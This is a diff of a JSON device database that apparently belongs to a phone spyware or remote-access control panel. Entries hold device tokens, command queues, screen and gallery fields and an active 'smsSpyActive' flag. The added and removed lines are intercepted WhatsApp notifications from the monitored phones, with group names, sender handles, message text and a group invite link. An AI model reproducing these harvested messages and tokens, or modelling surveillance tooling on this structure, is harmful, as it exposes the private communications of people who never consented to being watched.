@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778978113,
+    "lastSeen": 1776778981157,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3631 pesan dari 22 chat",
+        "time": "21/04 20:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778983640
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (992 pesan): ~ YANZZ",
+        "content": "https://chat.whatsapp.com/EXFjyL8nD42HU2TN8F06NE?mode=gi_t\n\nYG SUKA FT AN JOIN AJA",
+        "time": "21/04 20:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778983519
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (119 pesan): ~ RIZZSUGA PATNER YUDICRUEL PT PERGAM",
+        "content": "📷 LAST 340 ? NAIK KBRIN",
+        "time": "21/04 20:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778979796
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10304,30 +10328,6 @@
         "time": "21/04 20:18",
         "pkg": "com.whatsapp",
         "receivedAt": 1776777522992
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB JB APK BUG BY ZIDE × KYY😈 (2 pesan): ~ -Pr1nce★!🦸",
-        "content": "Ada gak yg jual nokos badak",
-        "time": "21/04 20:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777522632
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (957 pesan): Menyebut semua",
-        "content": "~ zunz: @⁨semua⁩",
-        "time": "21/04 20:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777522420
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (77 pesan): Daraa",
-        "content": "ITU UDAH DIKIRIM TU",
-        "time": "21/04 20:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777521822
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778979067,
+    "lastSeen": 1776778980581,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778977680,
+    "lastSeen": 1776778982757,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
